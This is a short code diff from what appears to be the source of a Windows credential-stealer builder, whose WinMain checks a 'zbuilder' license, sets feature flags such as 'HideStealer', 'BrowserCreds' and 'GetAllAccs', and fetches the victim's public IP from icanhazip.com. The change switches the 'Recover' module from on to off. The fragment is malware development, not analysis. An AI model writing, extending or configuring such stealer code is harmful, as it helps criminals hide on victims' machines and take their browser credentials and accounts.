@@ -54,7 +54,7 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
     string License = "[zbuilder{zbuilder}]";
     if (VerifyLicense(decrypt(License)))
     {
-        string Feature = "[Tracer:(N)]--[Recover:(Y)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
+        string Feature = "[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
         CleanUp();
         string RawIPInfo = DownloadString("http://icanhazip.com/");
         string IPInfo = RawIPInfo.erase(RawIPInfo.size() - 1);
